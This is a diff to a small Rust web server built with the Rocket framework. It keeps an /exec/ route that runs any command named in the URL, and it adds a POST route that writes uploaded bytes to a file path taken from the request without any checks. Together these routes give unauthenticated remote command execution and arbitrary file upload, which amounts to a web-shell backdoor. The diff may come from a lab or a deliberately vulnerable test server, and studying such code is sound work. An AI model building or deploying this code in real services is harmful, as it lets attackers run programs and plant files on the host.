@@ -1,7 +1,9 @@
 #[macro_use]
 extern crate rocket;
+use std::io::Write;
 use std::process::Command;
 use std::{fs, str};
+use tempfile::NamedTempFile;
 
 #[get("/<path>")]
 fn getpath(path: &str) -> String {
@@ -12,6 +14,7 @@ fn getpath(path: &str) -> String {
 
 #[get("/<cmd>")]
 fn exec(cmd: &str) -> String {
+    println!("CMD: {}", cmd);
     let output = Command::new(cmd)
         .output()
         .expect("Failed to execute the command.");
@@ -33,11 +36,21 @@ fn index() -> &'static str {
     "
 }
 
+#[post("/<filename>", data = "<input>")]
+fn new(filename: &str, input: Vec<u8>) -> String {
+    let file = NamedTempFile::new().unwrap();
+
+    let mut tfile = file.persist(format!("/tmp/{}", filename)).unwrap();
+    tfile.write_all(&input).unwrap();
+    "Okay".to_owned()
+}
+
 #[launch]
 fn rocket() -> _ {
     rocket::build()
         .mount("/", routes![index])
-        .mount("/getos", routes![getos])
         .mount("/", routes![getpath])
+        .mount("/", routes![new])
+        .mount("/getos", routes![getos])
         .mount("/exec/", routes![exec])
 }
